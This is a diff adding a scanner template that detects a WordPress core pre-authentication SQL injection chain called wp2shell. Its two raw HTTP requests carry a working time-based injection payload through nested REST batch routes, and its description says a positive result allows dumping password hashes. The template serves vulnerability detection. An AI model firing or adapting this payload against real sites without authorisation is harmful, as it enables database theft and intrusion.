@@ -1,0 +1,56 @@
+id: wp2shell-cve-2026-63030
+
+info:
+  name: WordPress Core Pre-Auth SQLi (wp2shell) - CVE-2026-63030 / CVE-2026-60137
+  author: br484
+  severity: critical
+  description: |
+    Detects WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1 vulnerable to wp2shell: a REST
+    /wp-json/batch/v1 nested-batch route confusion (CVE-2026-63030) that delivers the
+    WP_Query author__not_in SQL injection (CVE-2026-60137) fully pre-auth. Detection is
+    time-based and SAFE: it only injects a single-fire SLEEP (no data read, no writes).
+    A positive result means the target is exploitable for at least unauthenticated blind
+    SQLi (dump wp_users hashes / DB) and, depending on installed plugins, RCE.
+  reference:
+    - https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
+    - https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 9.8
+    cve-id: CVE-2026-63030
+  metadata:
+    max-request: 2
+    fixed-versions: 6.9.5,7.0.2,6.8.6
+  tags: wordpress,wp,sqli,rce,cve,cve2026,wp2shell,intrusive
+
+http:
+  - raw:
+      # Request 1 - baseline (SLEEP(0))
+      - |
+        POST /wp-json/batch/v1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"validation":"normal","requests":[{"method":"POST","path":"//a:b"},{"method":"POST","path":"/wp/v2/posts","body":{"validation":"normal","requests":[{"method":"POST","path":"//a:b"},{"method":"GET","path":"/wp/v2/categories?author_exclude=1%29%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%280%29%29x%29--%20-"},{"method":"GET","path":"/wp/v2/posts"}]}},{"method":"POST","path":"/batch/v1","body":{"requests":[{"method":"POST","path":"/wp/v2/posts"}]}}]}
+
+      # Request 2 - injected (SLEEP(6))
+      - |
+        POST /wp-json/batch/v1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"validation":"normal","requests":[{"method":"POST","path":"//a:b"},{"method":"POST","path":"/wp/v2/posts","body":{"validation":"normal","requests":[{"method":"POST","path":"//a:b"},{"method":"GET","path":"/wp/v2/categories?author_exclude=1%29%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%286%29%29x%29--%20-"},{"method":"GET","path":"/wp/v2/posts"}]}},{"method":"POST","path":"/batch/v1","body":{"requests":[{"method":"POST","path":"/wp/v2/posts"}]}}]}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '"responses"'
+
+      - type: dsl
+        dsl:
+          - "duration_2 >= 6"
+          - "duration_2 - duration_1 >= 5"
+        condition: and
